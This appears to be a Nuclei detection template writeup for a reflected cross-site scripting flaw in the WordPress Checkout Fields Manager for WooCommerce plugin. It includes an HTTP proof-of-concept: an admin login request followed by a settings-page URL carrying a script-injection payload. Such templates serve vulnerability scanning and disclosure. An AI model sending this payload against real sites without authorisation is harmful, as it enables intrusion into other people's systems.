# Nuclei Template: WordPress Checkout Fields Manager for WooCommerce <5.5.7 - Cross-Site Scripting
**Template ID:** checkout-fields-manager-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`checkout-fields-manager-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Checkout Fields Manager for WooCommerce 5.5.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wpscan.com/vulnerability/ea617acd-348a-4060-a8bf-08ab3b569577
- https://wordpress.org/plugins/woocommerce-checkout-manager
